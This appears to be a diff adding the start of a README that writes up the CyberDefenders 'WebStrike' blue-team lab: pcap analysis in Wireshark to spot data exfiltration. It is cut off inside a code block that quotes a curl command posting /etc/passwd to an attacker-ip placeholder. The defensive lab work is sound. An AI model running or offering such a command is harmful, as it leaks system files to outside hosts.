@@ -1,0 +1,12 @@
+# 🛡️ WebStrike – CyberDefenders Blue Team Lab
+
+## 🧠 Summary
+This lab simulated a **data exfiltration scenario**. As a blue teamer, my job was to analyze a `.pcap` file in **Wireshark** and identify whether an attacker tried to exfiltrate sensitive system files over the network.
+
+## 🔬 What I Did
+- Loaded the `WebStrike.pcap` file into **Wireshark**
+- Used the filter: `tcp.stream eq 13` to track suspicious traffic
+- Followed the TCP stream and discovered this command embedded in HTTP traffic:
+  
+  ```bash
+  curl -X POST -d /etc/passwd http://<attacker-ip>
